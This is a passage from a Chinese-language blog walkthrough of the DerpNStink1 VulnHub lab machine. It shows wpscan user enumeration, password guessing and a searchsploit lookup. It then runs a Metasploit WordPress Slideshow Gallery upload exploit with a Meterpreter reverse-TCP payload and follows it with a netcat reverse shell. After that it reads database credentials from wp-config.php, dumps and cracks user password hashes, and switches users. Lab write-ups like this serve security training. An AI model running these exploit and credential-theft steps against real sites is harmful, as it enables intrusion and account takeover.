+<p>这个地方遇到了一个问题，一开始我是想用gobuster来操作的，但是翻了翻help没找到咋才能让它来递归爆破。后面还是切回了dirsearch来搞，毕竟这个还是熟悉一点。gobuster确实功能比较多不止有dir模式还能爆破子域名、FUZZ模式之类的，相比之下dirsearch就比较专精了</p>
+<h3 id="WordPress-用户枚举"><a href="#WordPress-用户枚举" class="headerlink" title="WordPress 用户枚举"></a>WordPress 用户枚举</h3><p>这边是扫到了&#x2F;weblog目录，打开发现是wordpress直接上了wpscan来搞</p>
+<p>枚举用户</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]</span><br><span class="line">└─$ wpscan  --url http://derpnstink.local/weblog/ --api-token kD0O6cLtocayV2pMcGwfU6zXZoUytgYFZa8KGAYfhg0  -eu</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>爆破密码，先用cewl生成了个字典来爆破，但是没有成功，然后就换成了rockyou</p>
+<p>气人的是密码也是admin，我要哈气了！浪费我时间</p>
+<p>后台登录之后发现存在<strong>Slideshow</strong>这个东西，然后</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]                                                                    </span><br><span class="line">└─$ searchsploit Slideshow                                                                                     </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path                 </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Albinator 2.0.8 - <span class="string">&#x27;showpic.php?preloadSlideShow&#x27;</span> Cross-Site Scripting        | php/webapps/27811.txt </span><br><span class="line">Baby Katie Media VSReal and VScal 1.0 - <span class="string">&#x27;myslideshow.php?title&#x27;</span> Cross-Site S | php/webapps/28000.txt</span><br><span class="line">DVD Photo Slideshow Professional 8.07 - <span class="string">&#x27;Key&#x27;</span> Buffer Overflow                | windows/local/48041.py    </span><br><span class="line">DVD Photo Slideshow Professional 8.07 - <span class="string">&#x27;Name&#x27;</span> Buffer Overflow               | windows/local/48046.py</span><br><span class="line">DVD Photo Slideshow Professional 8.07 - Buffer Overflow (SEH)                | windows/local/45346.py</span><br><span class="line">Exponent CMS 0.97 - <span class="string">&#x27;Slideshow.js.php&#x27;</span> Cross-Site Scripting                  | php/webapps/34265.txt</span><br><span class="line">Flash Slideshow Maker Professional 5.20 - Buffer Overflow (SEH)              | windows_x86/local/45355.py      </span><br><span class="line">JetPhoto 1.0/2.0/2.1 - <span class="string">&#x27;Slideshow.php?name&#x27;</span> Cross-Site Scripting             | php/webapps/27618.txt</span><br><span class="line">JGS-Gallery 4.0 - <span class="string">&#x27;jgs_galerie_slideshow.php&#x27;</span> Multiple Cross-Site Scripting  | php/webapps/27306.txt</span><br><span class="line">Joomla! Component com_slideshow - Remote File Inclusion                      | php/webapps/4440.txt </span><br><span class="line">JV2 Folder Gallery 3.1.1 - <span class="string">&#x27;popup_slideshow.php&#x27;</span> Multiple Vulnerabilities    | php/webapps/12732.php     </span><br><span class="line">Movavi VideoSuite 8.0 Slideshow - <span class="string">&#x27;.jpg&#x27;</span> Local Crash (PoC)                   | windows/dos/16943.pl</span><br><span class="line">PhotoPost Pro 5.1 - <span class="string">&#x27;Slideshow.php?photo&#x27;</span> Cross-Site Scripting               | php/webapps/25310.txt</span><br><span class="line">PHPSlideShow 0.9.9 - <span class="string">&#x27;Directory&#x27;</span> Cross-Site Scripting                        | php/webapps/30806.txt</span><br><span class="line">Socusoft 3GP Photo Slideshow 8.05 - Buffer Overflow (SEH)                    | windows_x86/local/45352.py</span><br><span class="line">SocuSoft iPod Photo Slideshow 8.05 - Buffer Overflow (SEH)                   | windows_x86/local/45350.py</span><br><span class="line">TWiki 5.0.2 SlideShowPlugin - Slide Show Pages URI Cross-Site Scripting      | php/webapps/36163.txt</span><br><span class="line">Ultimate Fade-<span class="keyword">in</span> Slideshow 1.51 - Arbitrary File Upload                      | php/webapps/9469.txt</span><br><span class="line">uPhotoGallery 1.1 - <span class="string">&#x27;Slideshow.asp?ci&#x27;</span> SQL Injection                         | asp/webapps/29195.txt</span><br><span class="line">Wedding Slideshow Studio 1.36 - <span class="string">&#x27;Key&#x27;</span> Buffer Overflow                        | windows/local/48028.py</span><br><span class="line">Wedding Slideshow Studio 1.36 - <span class="string">&#x27;Name&#x27;</span> Buffer Overflow                       | windows/local/48050.py</span><br><span class="line">Wedding Slideshow Studio 1.36 - Buffer Overflow                              | windows/local/45142.py</span><br><span class="line">WordPress Plugin 1-jquery-photo-gallery-Slideshow-flash 1.01 - Cross-Site Sc | php/webapps/36382.txt</span><br><span class="line">WordPress Plugin cnhk-Slideshow - Arbitrary File Upload                      | php/webapps/39190.php</span><br><span class="line">WordPress Plugin CP Image Store with Slideshow 1.0.5 - Arbitrary File Downlo | php/webapps/37559.txt</span><br><span class="line">WordPress Plugin Feature Slideshow 1.0.6 - <span class="string">&#x27;src&#x27;</span> Cross-Site Scripting        | php/webapps/35285.txt</span><br><span class="line">WordPress Plugin GB Gallery Slideshow - <span class="string">&#x27;/wp-admin/admin-ajax.php&#x27;</span> SQL Injec | php/webapps/39282.txt</span><br><span class="line">WordPress Plugin image Gallery with Slideshow 1.5 - Multiple Vulnerabilities | php/webapps/17761.txt</span><br><span class="line">WordPress Plugin LB Mixed Slideshow - <span class="string">&#x27;upload.php&#x27;</span> Arbitrary File Upload     | php/webapps/37418.php</span><br><span class="line">WordPress Plugin SH Slideshow 3.1.4 - SQL Injection                          | php/webapps/17748.txt</span><br><span class="line">WordPress Plugin Slideshow - Multiple Cross-Site Scripting Vulnerabilities   | php/webapps/37948.txt</span><br><span class="line">WordPress Plugin Slideshow Gallery 1.1.x - <span class="string">&#x27;border&#x27;</span> Cross-Site Scripting     | php/webapps/36631.txt</span><br><span class="line">WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34514.txt</span><br><span class="line">WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34681.py</span><br><span class="line">WordPress Plugin WP Easy Slideshow 1.0.3 - Multiple Vulnerabilities          | php/webapps/36612.txt</span><br><span class="line">XnView 1.92.1 - <span class="string">&#x27;FontName&#x27;</span> Slideshow Buffer Overflow                         | windows/local/5346.pl</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results                                 </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本来想手动利用一下我一直以为是sql注入什么的漏洞，利用都没成功，开了个msf发现有个uploadfile2getshell的东西</p>
+<p>设置好payload直接开run</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Module options (exploit/unix/webapp/wp_slideshowgallery_upload):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS       192.168.55.129   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT        80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /weblog          <span class="built_in">yes</span>       The base path to the wordpress application</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line">   WP_PASSWORD  admin            <span class="built_in">yes</span>       Valid password <span class="keyword">for</span> the provided username</span><br><span class="line">   WP_USER      admin            <span class="built_in">yes</span>       A valid username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.55.128   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   WP SlideShow Gallery 1.4.6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/webapp/wp_slideshowgallery_upload) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.55.128:4444 </span><br><span class="line">[*] Trying to login as admin</span><br><span class="line">[*] Trying to upload payload</span><br><span class="line">[*] Uploading payload</span><br><span class="line">[*] Calling uploaded file myvzhfff.php</span><br><span class="line">[*] Sending stage (39927 bytes) to 192.168.55.129</span><br><span class="line">[+] Deleted myvzhfff.php</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.55.128:4444 -&gt; 192.168.55.129:44044) at 2025-04-11 01:40:24 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>成功拿下shell</p>
+<h2 id="立足点获取"><a href="#立足点获取" class="headerlink" title="立足点获取"></a>立足点获取</h2><p>因为没怎么用过msf，所以这shell用不习惯（果然野猪吃不了细糠啊），哈气！</p>
+<p>所以又弹了个nc到自己机器上</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411134357707.png"
+                      alt="image-20250411134357707"
+                ></p>
+<p>www-data权限太低了，开始提权之旅</p>
+<h2 id="机器信息收集"><a href="#机器信息收集" class="headerlink" title="机器信息收集"></a>机器信息收集</h2><p>用户有谁？</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd |grep /bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;loads/slideshow-gallery$ <span class="built_in">cat</span> /etc/passwd |grep /bin/bash                    </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash</span><br><span class="line">mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>计划任务</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;/html/weblog/wp-content/uploads/slideshow-gallery$ <span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>计划任务是空的</p>
+<p>sudo -l问我要www-data的密码，我有个集贸密码</p>
+<hr>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h3><p>因为是wordpress想着去看看wp-config.php这个文件里面的内容</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">www-data@DeRPnStiNK:/var/www/html/weblog$ <span class="built_in">cat</span> wp-config.php                                    </span><br><span class="line"><span class="built_in">cat</span> wp-config.php                                                                                              </span><br><span class="line">&lt;?php</span><br><span class="line">/**     </span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> * </span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.           </span></span><br><span class="line"><span class="string"> *                                                                                                             </span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *                     </span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix                  </span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *                                                                                                             </span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php                 </span></span><br><span class="line"><span class="string"> *                                   </span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */                                                                                                            </span></span><br><span class="line"><span class="string">                                                       </span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */                                                                  </span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">                                                       </span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */                  </span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>mysql<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">                                                       </span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);                  </span></span><br><span class="line"><span class="string">                                                       </span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>里面有mysql的密码，那很好了（这个地方实际上前期在靶机上信息枚举的时候应该先扫一下进程，端口网络侧信息之类的，可惜忘记了）</p>
+<p>连接上数据库</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| phpmyadmin         |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_wordpress        |</span><br><span class="line">+----------------------------+</span><br><span class="line">| wp_commentmeta             |</span><br><span class="line">| wp_comments                |</span><br><span class="line">| wp_gallery_galleries       |</span><br><span class="line">| wp_gallery_galleriesslides |</span><br><span class="line">| wp_gallery_slides          |</span><br><span class="line">| wp_links                   |</span><br><span class="line">| wp_options                 |</span><br><span class="line">| wp_postmeta                |</span><br><span class="line">| wp_posts                   |</span><br><span class="line">| wp_term_relationships      |</span><br><span class="line">| wp_term_taxonomy           |</span><br><span class="line">| wp_termmeta                |</span><br><span class="line">| wp_terms                   |</span><br><span class="line">| wp_usermeta                |</span><br><span class="line">| wp_users                   |</span><br><span class="line">+----------------------------+</span><br><span class="line">15 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">select * from wp_users;</span><br><span class="line">+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+</span><br><span class="line">| ID | user_login  | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key                           | user_status | display_name | flag2 |</span><br><span class="line">+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+</span><br><span class="line">|  1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky   | unclestinky@DeRPnStiNK.local |          | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 |           0 | unclestinky  |       |</span><br><span class="line">|  2 | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin         | admin@derpnstink.local       |          | 2017-11-13 04:29:35 |                                               |           0 | admin        |       |</span><br><span class="line">+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></div>
+
+<p>也是成功拿到了一个叫unclestinky的用户的密码</p>
+<p>发到hashcat爆破</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 400 -a 0  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41&#x27;</span><span class="string">&#x27;&#x27;</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>nnd!没有破出来，正准备去搜搜怎么搞的时候想起来可以在线破解</p>
+<p>推荐一个网站，我用起来基本上“只有”cmd5能找到的密码这里就也能找到.<br><a class="link"   target="_blank" rel="noopener" href="https://hashes.com/zh/decrypt/hash" >https://hashes.com/zh/decrypt/hash<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411135348085.png"
+                      alt="image-20250411135348085"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$P<span class="variable">$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span>:wedgie57</span><br></pre></td></tr></table></figure></div>
+
+<p>拿着这个密码去登录stinky用户</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky</span><br><span class="line">su stinky</span><br><span class="line">Password: wedgie57</span><br><span class="line"></span><br><span class="line">stinky@DeRPnStiNK:/var/www/html/weblog$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>至此用户立足点获取到了</p>
+<h3 id="stinky"><a href="#stinky" class="headerlink" title="stinky"></a>stinky</h3><p>进入家目录拿到flag.txt</p>
+<p>这里我在家目录找到了几个有意思的文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub_box/DerpNStink1]</span><br><span class="line">└─$ cat interstdir.txt        </span><br><span class="line">./Desktop:                                                                                                     </span><br><span class="line">total 12K                                                                                                      </span><br><span class="line">drwxr-xr-x  2 stinky stinky 4.0K Nov 13  2017 .                                                                </span><br><span class="line">drwx------ 12 stinky stinky 4.0K Jan  9  2018 ..                                                               </span><br><span class="line">-rwxr-xr-x  1 stinky stinky   72 Nov 12  2017 flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./ftp/files:                                                                                                   </span><br><span class="line">total 24K                                              </span><br><span class="line">drwxr-xr-x 5 stinky stinky  4.0K Nov 12  2017 .                                                                </span><br><span class="line">drwxr-xr-x 3 nobody nogroup 4.0K Nov 12  2017 ..                                                               </span><br><span class="line">drwxr-xr-x 2 stinky stinky  4.0K Nov 12  2017 network-logs                                                     </span><br><span class="line">drwxr-xr-x 3 stinky stinky  4.0K Nov 12  2017 ssh                                                              </span><br><span class="line">-rwxr-xr-x 1 root   root      17 Nov 12  2017 test.txt                                                         </span><br><span class="line">drwxr-xr-x 2 root   root    4.0K Nov 12  2017 tmp    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./ftp/files/network-logs/derpissues.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh:                                                                       </span><br><span class="line">total 12K                                                                                                      </span><br><span class="line">drwxr-xr-x 2 stinky stinky 4.0K Nov 13  2017 .         </span><br><span class="line">drwxr-xr-x 3 stinky stinky 4.0K Nov 12  2017 ..                                                                </span><br><span class="line">-rwxr-xr-x 1 root   root   1.7K Nov 13  2017 key.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>一个一个看看</p>
+<p>flag.txt</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stinky@DeRPnStiNK:~/Desktop$ cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)</span><br><span class="line">stinky@DeRPnStiNK:~/Desktop$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>&#x2F;ftp&#x2F;files&#x2F;network-logs&#x2F;derpissues.txt</p>
